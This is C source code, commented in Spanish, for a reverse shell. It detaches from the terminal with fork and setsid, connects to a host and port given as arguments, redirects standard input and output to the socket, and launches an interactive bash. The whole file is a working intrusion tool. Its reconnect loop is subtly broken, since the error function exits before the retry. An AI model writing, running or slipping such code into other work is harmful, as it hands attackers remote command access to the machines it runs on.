// Uso: filename hostname port
// argv[0] filename
// argv[1] hostname
// argv[2] port

#include <netdb.h>
#include <netinet/in.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

// Funcion de error del programa
void error(const char *msg) {
  perror(msg);
  exit(1);
}

int main(int argc, char *argv[]) {

  //FORK (separar terminal de proceso)}
  pid_t pid = fork();
  if(pid < 0 ) exit(1);
  if(pid > 0 ) exit(0);

  if(setsid() == -1) _exit(1);

  // Determinar numero de argumentos
  if (argc < 2) {
    fprintf(stderr, "No se proporciono el puerto");
  }

  // FD, Puerto, status (Salida)
  int sockfd, portno, n;
  // Estructura con la configuracion del servidor
  struct sockaddr_in serv_addr;
  // Estructura que almacena informacion de un host dado
  struct hostent *server;

  // buffer donde escribiremos los mensajes del cliente/server
  if (argc > 3) {
    fprintf(stderr, "Llamada incorrecta. Uso: ./%s hostname puerto\n", argv[0]);
    exit(0);
  }

  // Convertir numero de puerto char*->int
  portno = atoi(argv[2]);

  // convertir char en formato de direccion IP
  server = gethostbyname(argv[1]);
  // Error al conectarse al host
  if (server == NULL) {
    fprintf(stderr, "Error, no existe ese host. ");
    exit(1);
  }
  // Limpiar la estructura contenedora de la info del server
  bzero((char *)&serv_addr, sizeof(serv_addr));

  // server IPV4
  serv_addr.sin_family = AF_INET;

  // Copiar direccion al server_address
  //  bcopy((char *)server->h_addr_list[0], (char *)&serv_addr.sin_addr.s_addr,
  //        server->h_length);
  memcpy(&serv_addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
  // Asignar puerto a la estructura del server
  serv_addr.sin_port = htons(portno);


  while (1) {
    // Socket de internet, TCP, protocolo 0 (TCP)
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
      error("No se pudo crear el FD del socket");
      sleep(5);
      continue;
    }
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
      error("No ha sido posible establecer la conexion");
      close(sockfd);
      sleep(5);
      continue;
    }

  //Redirigir salidas
    dup2(sockfd, STDIN_FILENO);
    dup2(sockfd, STDOUT_FILENO);
    dup2(sockfd, STDERR_FILENO);
    // execl("/usr/bin/script", "script", "-q", "/bin/bash", NULL);
    execl("/bin/bash", "bash","-i", NULL);
  }

  close(sockfd);
  return 0;
}
